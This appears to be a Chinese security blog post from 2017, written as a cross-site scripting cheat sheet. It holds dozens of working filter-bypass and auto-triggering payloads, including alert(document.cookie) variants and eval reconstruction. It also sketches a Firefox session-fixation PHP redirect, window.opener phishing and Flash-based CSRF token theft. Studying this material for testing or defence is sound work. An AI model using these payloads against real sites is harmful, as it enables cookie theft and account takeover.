---
title: XSS
date: 2017-09-16 01:53:10
tags: WEB安全
---

# XSS
分类
## 需要服务器参与
* 反射性XSS
* 储存性XSS
* flash
## 不需要服务器参与
* DOM XSS



***
输出模型

```
1. <HTML标签>[输出]</HTML标签>
2. <script>[输出]</script>
3. <style>...[输出]...</script>
4. <HTML标签onXXXX="...[输出在这里]..">
5. <a href="javascript:[输出在这里]">xxxx</a>
>(onxxxx="[输出]"和href="javascript:[输出]"与<script>[输出]</script>没有太大区别)

6. <iframe src="[输出]"></iframe>
7. script src="/path/xxx/.../yyy/xx.json?callback=alert(1)
   script src="/xxxx/json.php?callback=xxxx&param1=yyy&param2=[参数可控]"(覆盖callback)
```

***

#### DOM XSS 挖掘
```txt
1. 可以在右键源码页面有回显
2. 可以在控制台定位
3. 添加一些符号导致js报错
```
***

#### flash xss 挖掘
输入模型
1. ExternalInterface.call 第一个参数可控
```txt
try{__flash__toXML(函数名("参数1"));}catch(e){"<undefined/>";}(一种绕过方式)

try{__flash__toXML(SWFUpload.instances["aaaaaaaa"].flashReady("参数1"));}catch(e){"<undefined/>";}
我们再基于以上代码来构造，
try{__flash__toXML(SWFUpload.instances["aaa"])}catch(e){alert(1)};//"].flashReady("参数1"));}catch(e){"<undefined/>";}

```
2. ExternalInterface.call 第二个参数可控
```txt
try{__flash__toXML(custom_menu_swf("构造点"),alert("构造点"));}catch(e){"<undefined/>";}
try{__flash__toXML(custom_menu_swf("构造点\\"))}catch(e){alert(1)}//构造点"));}catch(e){"<undefined/>";}
```
挖掘方法
```txt
1. 反编译swf，发现危险函数
2. 首先确定FLASH是否有接受参数
```
XSS 绕过Tips
##浏览器特性
* chrome会自动对",>,<进行转换。
```txt
    ?key;alert(1);//=aaaa
    换成
    this.key="aaa";alert(1);//";
    会变成
    this.key="aaa%22;alert(1);//";

```
* iframe 相关
```txt
    onload执行js:
        <iframe onload="alert(1)"></iframe>,src执行javascript代码
        <iframe src="javascript:alert(1)"></iframe>
    IE下vbscript执行代码:
        <iframe src="vbscript:msgbox(1)"></iframe>
    Chrome下data协议执行代码：
        <iframe src="data:text/html,<script>alert(1)</script>"></iframe>Chrome
    上面的变体
        <iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
    Chrome下srcdoc属性
        <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
```

## js特性的绕过
* 以functionxxx(){}形式定义的函数，都会被最优先解析。这样可以对一些未定义变量进行绕过
* JS的字符串中的字符可以写为unicode编码
    ```txt
    在JS字符串里，<不光可以写为\u003c，还可以写为\x3c，>同样可以写为\x3e
    ```
*
## 编码类型的绕过
1. 在HTML属性中，会自动对实体字符进行转义
```txt
<img src="1"onerror="alert(1)">
和
<img src="1"onerror="alert&#x28;1&#x29;">
是等效的

```

2.
## flash 类型的绕过
## 标签类型的绕过
javascript on*事件、style属性、action/src/href等

```txt
 onafterprint
onbeforeprint
onbeforeunload
onerror
onhaschange
onload
onmessage
onoffline
ononline
onpagehide
onpageshow
onpopstate
onredo
onresize
onstorage
onundo
onunload
onblur
onchange
oncontextmenu
onfocus
onformchange
onforminput
oninput
oninvalid
onreset
onselect
onsubmit
onkeydown
onkeypress
onkeyup
onclick
ondblclick
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
onmousedown
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onscroll
onabort
oncanplay
oncanplaythrough
ondurationchange
onemptied
onended
onerror
onloadeddata
onloadedmetadata
onloadstart
onpause
onplay
onplaying
onprogress
onratechange
onreadystatechange
onseeked
onseeking
onstalled
onsuspend
ontimeupdate
onvolumechange
```
## 敏感字拼接的绕过
1. 利用数组方式来拼接
```txt
js里的对象成员方法也可以用数组的形式的表示
简单的说,比如eval()函数就可以用top对象的成员方法来表示
top['ev'+'al'](evalcode)
如果是过滤了函数名()的形式,使用下列方法
/1/[Symbol.replace]('1',alert)
如果是直接过滤了函数名,比如eval,我们可以这样来触发xss
x="onfocus=top["ev"%2b"al"](alert(1))//
使用字符串拼接的方式来构造出eval
```
2. 利用location的url解码特点
```txt
现代浏览器基本支持javascript:code 这种伪协议
而location在跳转的过程中又会自动解码,因此我们可以试图把敏感部分进行二次编码
存放到location部位。
比如我们通过这样的方式来调用eval
x="onfocus=location="javascript:%2565%2576%2561%256c(alert(1))"//
可以看到,成功的通过eval去调用了alert(1)
那你会问,如果括号也被过滤了呢? 继续编码就好了
构造如下的payload
x="onfocus=location="javascript:%2565%2576%2561%256c%2528alert%25281%2529%2529"//
```
3. 利用location.hash来存放
```txt
location.hash是浏览器中用于定位锚的字符串,它是不会向服务端发送的,因此也不会被过滤
所以我们可以构造如下payload来进行绕过
x="onfocus=outerHTML=location.hash//#<img/src="#" onerror=alert(document.cookie)>
这个payload存在url编码
x=" onmouseover=outerHTML=decodeURIComponent(location.hash)//#<img/src="#" onerror=alert(1)>
base64
http://t1m00n.tk/xsstest.php?x=" onmouseover=outerHTML=atob(location.hash.substr(1))//#PGltZy9zcmM9IiMiIG9uZXJyb3I9YWxlcnQoMSk+
```
4. String.fromCharcode() 可以从ascii码中解析出特定的字符串,比如这里过滤document.cookie
```txt
x="onfocus=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,10
7,105,101,41))//
```

5. 利用window.name进行跨域传输
```txt
用在location.hash被过滤/长度不够,或者不能使用点号的情况
这里可以使用一个<iframe scr="payload" name="evilcode" />的方式,在window.name中存储代码
其实这种方法也被称为回旋镖
它能够把一个反射XSS升格为类似存储型XSS的效果
这里以绕过对eval的过滤为例
<iframe src="http://127.0.0.1/q.php?x=1%22onfocus=location=window.name//"
name="javascript:eval(alert(document.cookie))" width="100%" height="100%" />
```

6. 利用<svg>标签,<svg>内部的标签和语句遵循的规定是直接继承自xml而不是html
```txt
区别在于,<svg>内部的<script>标签中,可以允许一部分进制/编码后的字符(比如实体编码)
这里绕过对括号的过滤,使用实体编码为例,&#[十进制],&#x[十六进制] 作为例子
使用如下payload
1"><svg><script>alert%26%23x28;1%26%23x29</script></svg>
补充:svg里的<script>,还甚至可以使用<!-- -->来进行整段注释
```

7. 利用ES6模板字符串
```txt
`${some string}` 使用反引号
中间的some string会被当作表达式解析,简单的说就是你可以在这里使用变量
当然,一个很明显的地方就是,如果只是过滤了某个特定的字符,完全可以用这种方式绕过
举个简单的例子,如果过滤掉了1
我们可以用 `${3-2}` 这种方式来表示1
而且有一部分函数是支持不用括号传参,直接使用模板字符串作为参数的。
比如prompt,我们这里用它来弹出1
使用如下的payload
x="onfocus=prompt`${3-2}`//
```

## 针对特定敏感关键字的绕过方法
1. 针对过滤了.符号
```txt
使用with()方法可以设定对象的作用域
也就是我原本要访问location.hash
由于点号被过滤
只需要使用with(location)hash即可
构造payload如下
1" onfocus=with(location)alert(hash)//#11
如果过滤的点号被使用在域名中
那么在ie/chrome/ff下
使用 。(%E3%80%82) 是可以代替 .的
```

2.针对过滤了()号
```txt
使用throw传递参数,配合 ES6模板字符串 `${some string}`
具体的思路是,throw可以抛出一个异常(err)交给异常处理函数去处理
但是如果它没有在try...catch结构中使用的话,就会引发一个uncaught 'err内容' 的异常
也就是抛出的整个异常内容是 "uncaugh 'err内容'"
比如这样
所以,如果我们把异常处理函数绑定为eval
eval实际收到的就是一个Uncaught=alert(document.cookie)的表达式
它会自动执行这个表达式
而throw本身接受参数的时候是可以接受模板字符串作为参数的
所以构造如下payload
1"onfocus=top.onerror=eval;throw`=alert\x28document.cookie\x29`//
这里等号的目的就是使它成为一个合法的表达式
成功
```

3. 过滤了空格
```txt
在标签的名称和第一个属性之间 可以用 / 来代替空格
<img/src="#" />
而在其他的某几个位置换行符也是可以起效的,具体我没有进行测试
《web之困》上有一个讲解这个知识点的地方
只是大概的举一个payload作为例子
x=1"><img/src=%23%0aonerror=alert(1)>
我们不使用双引号来闭合,但是通过%0a作为分隔符获得了一样的效果
```

4. 过滤了\r\n等换行符
```txt
javascript里允许用U+2028作为换行符
因此,这时我们可以插入一个\u2028来实现绕过
```

5. 过滤\<script\>,而最终又转换为了大写
```txt
http://dba86.com/docs/other/grep.html
中给出了一些德语符号和拉丁文符号
其中拉丁文中的'long s' 在大写时会被转换为英语的'S'
因此可以绕过这个限制。
```

6. 过滤了大部分符号,而又输出在var x = {} 中
```txt
只要双引号和()没被绕过
就可以使用"somestr"(alert(1))in"otherstr"
的方式执行
原理是这样的
js的解释器的特点 => 初步检查只管语法正确 => ('只要不报syntax error')则类型等其他问题只有等执行时才会报错
=> 在报错之前会按照语法树解析的顺序一直执行下去。
而"somestr"()则是把"somestr"(注意,是包含引号的整体)作为了函数名
把(alert(1))作为参数进行传递
而这时会先进行参数值的解析,因此函数会得到执行
```

7. 过滤了注释符//
```txt
-->也可以作为js的行注释符
比如构造如下payload
<script>
alert(1)-->xsasxqwewqe
</script>
```

8. 仍然是过滤了//,只是这次用在协议+域名中
```txt
在ie下
使用 /ゝ (%E3%82%9D) 代替 //
```

9. 使用str.replace中的replacement可控
```txt
在过滤了"的作用下,如果这时可以通过$`取到第一个匹配前的所有字符
或者$1取到第一个匹配分组
那么即使我们传入的replacement已经过一次检查
替换后的结果中仍然可以存在"
```
***

## 针对某些过滤方法的绕过
1. 如果对于某个object的属性,在检查到非法字符串的时候使用了delete对其进行清除,那么我们可以通过向其原型传递参数的方法来进行绕过。
```txt
比如x={'name':'invalid','__proto__':{'name':'evilcode'}}
则这时如果使用__proto__进行属性的赋值
因为__proto__是x对象的原型,所以如果对name进行delete
delete x.name;
则这个语句delete x自身的属性后
x会继承其__proto__的属性
有一点像c++里的子类继承父类属性
```

## 长度限制的bypass
1. window.name跨域
```txt
使用iframe跨域的话,自身的payload长度就可以得到极大的缩短
因为你唯一需要的就是执行window.name里的代码
有在特定的场景下,window.name由于window是一个全局对象,可以直接省略window
而是用name去访问我们的window.name
而window.name能够承载的长度很大,足够我们绕过
因此我们的只需要eval(name)就可以了
使用如下payload
<iframe src="http://127.0.0.1/q.php?x=1%22onfocus=eval(window.name)//" name="alert(document.cookie)"
width="100%" height="100%" />
成功执行
```
2. jquery工厂函数
```txt
jquery的工厂函数$()需要传入的是一个完整的html标签
它会自动的构造起里面的标签,并且执行里面的代码
如果我们使用了$(location.hash)就缩短了非常多的长度
做一个小小的测试
使用的payload是这样的
<iframe src="http://127.0.0.1/q.php?x=1%22onfocus=$(window.name)//" name="<img src='#'
onerror=alert(document.cookie) />" width="100%" height="100%" />
也能够成功的执行了代码,而且进一步缩短了payload的长度
```

3. 使用短域名
```txt
曾经wooyun上的一篇文章有提到过这个问题,在payload长度相同的情况下,谁的域名越短
谁就拥有了先天的优势。
比如一些物理单位符号,可以被合法的注册,而且会被自动解析到对应的英文域名
包括之后出现的一些韩语域名,emoji域名,也许都可以用来缩短我们的payload长度
```

## 构造无需交互的payload&绕过事件过滤
1. onerror/onload 事件
```txt
两个事件是最容易触发,而且无需交互的
比如如下的payload
<svg/onload=alert(1)>
<img src="#" onerror=alert(1) />
但是这两个事件太常见了,非常容易就遭到了过滤
而且也有相当一部分标签不支持onerror等事件
```

2. onfocus与autofocus
```txt
对于<input>等标签来说,onfocus事件使他们在获得焦点时
而autofocus则会让他们自动获得焦点
因此,很容易利用这个构造出如下的payload,使他们自动获得焦点并触发事件执行js
1"%20autofocus%20onfocus=alert(1)//
完整的html标签是这样的
<input value="1" autofocus onfocus=alert(1)// >
```

3. onblur与autofocus
```txt
onblur是标签失去焦点时引发的事件,那么你可能就会问了
这和我无需交互的payload有什么关系呢
很简单,我们来看看怎么样让标签'自动'失去焦点
(1)在稍早版本的chrome中
我们构造如下payload
x=1"><input%20onblur=alert(1)%20autofocus><input%20autofocus><input%20autofocus>
有好几个标签来'竞争' autofocus的焦点,那么 只要我们的第一个带有onblur事件的input,在获得焦点后,又因为竞争而
失去焦点的话,就可以触发这个payload了
(2)在最新版本中
由于上一个payload已经无法正常工作了,但是我们仍然能够通过
x=1"><input%20onblur=alert(1)%20autofocus>
来构造一个需要较少交互的xss向量
用户只要随意点击窗口里的任意一个地方就会触发我们的payload
但是非常多其他标签似乎无法触发onfocus,更不要说autofocus了
```

4. <details>标签的ontoggle事件
```txt
如果大部分常见事件都被过滤掉了,我们仍然有办法来构造一个无需交互的xss向量
这就是<details>标签的ontoggle属性,它会在自身的open属性不为空时触发
构造如下payload
x=1"><details%20open%20ontoggle="alert(1)">
在chrome最新版本中有效
```

5. flash-xss的自动触发
```txt
没测试！！！
在之前的chrome auditor bypass中,它似乎非常鸡肋
但是在存储型xss和其他浏览器的场景下,用它可以构造非常有效的攻击向量
payload构造如下
x=1"><embed+type="application/x-shockwaveflash"+
allowscriptaccess=always+src=https://www.math1as.com/3.">
```

6. 任意标签的自动触发
```txt
那么如何实现任意标签的自动触发这一目标呢
这里只简单的讲一个技巧
可以用任意脚本构造出无需交互的payload
如我们所知,有很大一部分标签是"不响应"onfocus事件的
你用鼠标移动上去,他没有任何的反应
但事实上,真的如此么?
我们试着给它添加一个tabindex属性
然后为它设置id=1
最后用location.hash来定位到id=1的锚点,就可以让他获得焦点
这里我们用一个不存在于标准里的标签<hero>来测试
构造如下payload
x=1"><hero%20id="1"%20tabindex="0"%20onfocus=alert(1)>#1
对应的标签是
<hero id="1" tabindex="0" onfocus=alert(1)>
于是,我们就获得了一个构造任意标签的自动触发payload的方法。
```

## 绕过的骚套路
1. firefox <50.02跨域问题
```txt
可以产生一个固定会话漏洞
插入一张图片<img src='/test'>
在服务器上把/test urlrewrite到 /xss/ff.php
在ff.php则用302将浏览器重定向到一个dataURL
<?php
$key="hehe";
$val="tester";
header("Location: data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='100'></circle>
<foreignObject><html xmlns='http://www.w3.org/1999/xhtml'><meta http-equiv='Set-Cookie'
content='$key=$val'/></html></foreignObject></svg>");
?>
然后在受害者访问的网站里插入<img src="//xss.com/test" />
访问后受害者的cookie被设置为hehe=tester 产生了一个固定回话漏洞
此时如果受害者尝试进行登陆,我们随后就可以用这个被认证了的cookie以用户身份使用其账号
因为chrome不允许302跳转到base64链接(如图)
所以只能在firefox下使用这个攻击手法
而且大部分网站的富文本编辑器都允许插入一张图片
因此危害还是比较大的。
```

2. 利用 opener进行钓鱼
```txt
在js中可以使用window.opener (也就是当前window的父窗体)来访问到打开本窗体的页面
比如我的chrome有两个标签页,从a标签页打开了b,那么b就可以通过window.opener.location
反过来控制a标签页的地址
虽然很明显的,浏览器不允许其跳转到一个javascript地址,但是却可以跳转到一个dataURL
因此我们可以伪造一个a标签页对应网站的登陆页面,让用户以为是自己掉线了
从而实现钓鱼的功能。
```

3. 利用flash制造跨域CSRF
```txt
在大多数站点中,我们都拥有上传图片或者其他附件的权限
特别是当上传图片的过程中,即使我们上传的并非一个真正的图片文件
站点也仅仅是校验了后缀名而非文件内容的合法性
除非规定了content-disposition的强制响应头
chrome等主流浏览器都会无视其响应头而当做flash解析
而当我们在attacker.com上引用victim.com的flash文件时
虽然无法直接跨域执行victim.com的js,制造一个sop xss
但是我们仍然可以通过其进行跨域(如果没有进行好crossdomain.xml的配置)
可以偷取到用户的敏感数据,以及CSRF token
从而实现一些后台getshell,或者对self-xss加以利用
```
